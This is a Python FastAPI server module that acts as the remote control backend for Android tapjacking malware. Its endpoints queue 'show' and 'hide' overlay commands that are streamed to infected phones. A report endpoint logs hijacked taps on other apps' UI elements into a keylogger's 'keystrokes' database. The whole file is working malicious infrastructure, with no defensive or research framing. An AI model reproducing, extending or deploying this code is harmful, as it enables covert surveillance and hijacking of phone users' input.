from fastapi import APIRouter, HTTPException
from fastapi.responses import StreamingResponse
from pydantic import BaseModel
import asyncio
import sqlite3
from datetime import datetime, timezone, timedelta

app = APIRouter()

# Global tracking variables for real-time reporting
PENDING_COMMANDS = []
OVERLAY_CURRENT_STATE = False  # False means Hidden, True means Active Deployed

DB_FILE = "keystrokes.db"
MY_TIMEZONE = timezone(timedelta(hours=8))

class TapjackResult(BaseModel):
    session_id: str
    target_app_name: str
    target_app_id: str
    clicked_element_id: str
    clicked_element_text: str

async def sse_event_generator():
    """Streams commands in real-time to the Android client using Server-Sent Events"""
    while True:
        if PENDING_COMMANDS:
            command = PENDING_COMMANDS.pop(0)
            yield f"data: {command}\n\n"
        await asyncio.sleep(0.1)

@app.get("/stream")
async def tj_stream():
    """The mobile client connects here to listen for real-time overlay adjustments"""
    return StreamingResponse(sse_event_generator(), media_type="text/event-stream")

@app.get("/show")
async def tj_show():
    """Trigger endpoint to remotely render the overlay on the screen"""
    global OVERLAY_CURRENT_STATE
    PENDING_COMMANDS.append("show")
    OVERLAY_CURRENT_STATE = True
    return {"status": "success", "action": "queued_show", "message": "Overlay activation command pushed."}

@app.get("/hide")
async def tj_hide():
    """Trigger endpoint to remotely remove the overlay view"""
    global OVERLAY_CURRENT_STATE
    PENDING_COMMANDS.append("hide")
    OVERLAY_CURRENT_STATE = False
    return {"status": "success", "action": "queued_hide", "message": "Overlay removal command pushed."}

@app.get("/status")
async def tj_status():
    """Utility endpoint to view the current queue length and active state matrix"""
    return {
        "queue_length": len(PENDING_COMMANDS), 
        "pending": PENDING_COMMANDS,
        "overlay_active": OVERLAY_CURRENT_STATE
    }

@app.post("/report-click")
async def report_click(data: TapjackResult):
    """Receives touch-hijacking breakthrough confirmations from the mobile client package"""
    try:
        malaysia_time = datetime.now(MY_TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Format the exploit telemetry into the keylogger datastore fields
        exploit_string = f"[TAP JACK EXPLOITED] Component: {data.clicked_element_text} ({data.clicked_element_id})"
        
        cursor.execute('''
            INSERT INTO keystrokes (session_id, key_val, app_name, app_id, field_hint, field_name, field_id, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            data.session_id,
            exploit_string,
            data.target_app_name,
            data.target_app_id,
            "VULNERABLE SURFACE DETECTED",
            data.clicked_element_id,
            0,
            malaysia_time
        ))
        conn.commit()
        conn.close()
        
        print(f"[{malaysia_time}] Registered Tapjack exploit outcome entry: {data.session_id}")
        return {"status": "success", "message": "Tapjacking exploit logged successfully."}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
